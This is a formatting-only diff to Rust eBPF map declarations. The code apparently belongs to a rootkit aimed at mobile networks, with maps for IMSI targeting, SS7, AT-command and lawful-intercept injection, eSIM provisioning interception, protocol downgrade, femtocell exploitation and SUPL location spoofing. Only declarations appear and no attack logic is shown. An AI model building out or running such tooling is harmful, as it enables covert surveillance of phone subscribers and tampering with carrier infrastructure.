@@ -3,9 +3,9 @@ use aya_ebpf::{
     maps::{HashMap, RingBuf},
 };
 use common::{
-    CellInfo, EsimProvisionCtx, FemtocellCtx, GtpTunnelState, ImsSipSession,
-    LiInterfaceState, NetworkSliceInfo, RoamingState, RootkitConfig, RtpStreamState,
-    SignalingState, SuplSpoofState, VoWiFiTunnelState,
+    CellInfo, EsimProvisionCtx, FemtocellCtx, GtpTunnelState, ImsSipSession, LiInterfaceState,
+    NetworkSliceInfo, RoamingState, RootkitConfig, RtpStreamState, SignalingState, SuplSpoofState,
+    VoWiFiTunnelState,
 };
 
 // ──────────────────────────────────────────────
@@ -36,15 +36,13 @@ pub(crate) static AT_CMD_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_ma
 pub(crate) static IMSI_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(64, 0);
 
 #[map]
-pub(crate) static GTP_TUNNEL_STATE: HashMap<u32, GtpTunnelState> =
-    HashMap::with_max_entries(32, 0);
+pub(crate) static GTP_TUNNEL_STATE: HashMap<u32, GtpTunnelState> = HashMap::with_max_entries(32, 0);
 
 #[map]
 pub(crate) static SS7_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
 
 #[map]
-pub(crate) static DIAMETER_STATE: HashMap<u32, SignalingState> =
-    HashMap::with_max_entries(32, 0);
+pub(crate) static DIAMETER_STATE: HashMap<u32, SignalingState> = HashMap::with_max_entries(32, 0);
 
 #[map]
 pub(crate) static CELL_HISTORY: aya_ebpf::maps::Array<CellInfo> =
@@ -65,8 +63,7 @@ pub(crate) static DOWNGRADE_TARGETS: HashMap<u32, u8> = HashMap::with_max_entrie
 // ──────────────────────────────────────────────
 
 #[map]
-pub(crate) static IMS_SIP_SESSIONS: HashMap<u64, ImsSipSession> =
-    HashMap::with_max_entries(64, 0);
+pub(crate) static IMS_SIP_SESSIONS: HashMap<u64, ImsSipSession> = HashMap::with_max_entries(64, 0);
 
 #[map]
 pub(crate) static RTP_STREAMS: HashMap<u32, RtpStreamState> = HashMap::with_max_entries(32, 0);
@@ -85,8 +82,7 @@ pub(crate) static ESIM_PROVISION_STATE: HashMap<u64, EsimProvisionCtx> =
 pub(crate) static SMDP_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);
 
 #[map]
-pub(crate) static NETWORK_SLICES: HashMap<u32, NetworkSliceInfo> =
-    HashMap::with_max_entries(16, 0);
+pub(crate) static NETWORK_SLICES: HashMap<u32, NetworkSliceInfo> = HashMap::with_max_entries(16, 0);
 
 #[map]
 pub(crate) static SLICE_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
@@ -99,23 +95,20 @@ pub(crate) static VOWIFI_TUNNELS: HashMap<u64, VoWiFiTunnelState> =
 pub(crate) static IKE_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);
 
 #[map]
-pub(crate) static LI_INTERFACES: HashMap<u32, LiInterfaceState> =
-    HashMap::with_max_entries(32, 0);
+pub(crate) static LI_INTERFACES: HashMap<u32, LiInterfaceState> = HashMap::with_max_entries(32, 0);
 
 #[map]
 pub(crate) static LI_X2_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
 
 #[map]
-pub(crate) static FEMTOCELL_TARGETS: HashMap<u32, FemtocellCtx> =
-    HashMap::with_max_entries(16, 0);
+pub(crate) static FEMTOCELL_TARGETS: HashMap<u32, FemtocellCtx> = HashMap::with_max_entries(16, 0);
 
 #[map]
 pub(crate) static FEMTO_EXPLOIT_STATE: aya_ebpf::maps::Array<u32> =
     aya_ebpf::maps::Array::with_max_entries(4, 0);
 
 #[map]
-pub(crate) static SUPL_SPOOF_STATE: HashMap<u64, SuplSpoofState> =
-    HashMap::with_max_entries(16, 0);
+pub(crate) static SUPL_SPOOF_STATE: HashMap<u64, SuplSpoofState> = HashMap::with_max_entries(16, 0);
 
 #[map]
 pub(crate) static LPP_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
